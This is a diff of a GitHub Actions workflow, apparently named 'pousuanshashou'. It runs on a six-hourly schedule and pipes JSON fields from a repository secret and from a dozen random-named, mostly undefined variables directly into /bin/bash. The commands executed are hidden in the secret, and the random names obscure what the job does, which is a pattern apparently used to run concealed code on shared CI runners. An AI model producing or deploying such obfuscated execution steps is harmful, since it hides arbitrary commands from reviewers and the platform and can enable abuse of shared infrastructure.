@@ -1,9 +1,9 @@
 name: pousuanshashou
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 3/6 * * *'
+    - cron: '7 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,10 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: pousuanshashou
         env:
-          snlv4: ${{ secrets.snlv4 }}
+          wg0: ${{ secrets.wg0 }}
         run: |
-          echo $snlv4 | jq -r .me8636 | /bin/bash
-          echo $mes76338 | jq -r .mecrq09177 | /bin/bash
-          echo $xpm72219 | jq -r .jwf66 | /bin/bash
-          echo $aklmu1090 | jq -r .vay43 | /bin/bash
+          echo $wg0 | jq -r .udp4 | /bin/bash
+          echo $po2 | jq -r .dal8961 | /bin/bash
+          echo $w36594 | jq -r .h4 | /bin/bash
+          echo $s5910 | jq -r .eao97 | /bin/bash
+          echo $vdxhf22156 | jq -r .zn54979 | /bin/bash
+          echo $hsd037 | jq -r .u47 | /bin/bash
+          echo $sorbv914 | jq -r .zmi87 | /bin/bash
+          echo $mr1653 | jq -r .z31 | /bin/bash
+          echo $ufvaw251 | jq -r .fsegs73291 | /bin/bash
+          echo $qys9 | jq -r .pv3 | /bin/bash
+          echo $euk1837 | jq -r .jvu7 | /bin/bash
+          echo $jmaat7 | jq -r .nw454 | /bin/bash
 
